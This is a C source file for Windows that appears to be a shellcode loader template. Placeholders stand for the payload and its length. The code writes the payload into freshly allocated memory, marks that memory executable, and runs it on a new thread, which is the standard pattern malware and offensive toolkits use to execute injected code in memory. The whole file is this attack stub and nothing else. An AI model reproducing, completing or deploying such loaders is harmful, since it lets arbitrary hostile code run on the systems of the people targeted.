#include <windows.h>

unsigned char calc_payload[{{Len}}] = {
    {{Shellcode}}
};

unsigned int payload_len = sizeof(calc_payload);

int main(void) {
    
	PVOID calcSt;
	HANDLE calcTH;
    DWORD oldProtectCalc = 0;
	calcSt = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(calcSt, calc_payload, payload_len);
	VirtualProtect(calcSt, payload_len, PAGE_EXECUTE_READ, &oldProtectCalc);
    calcTH = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) calcSt, 0, 0, 0);
    WaitForSingleObject(calcTH, -1);
	return 0;
}
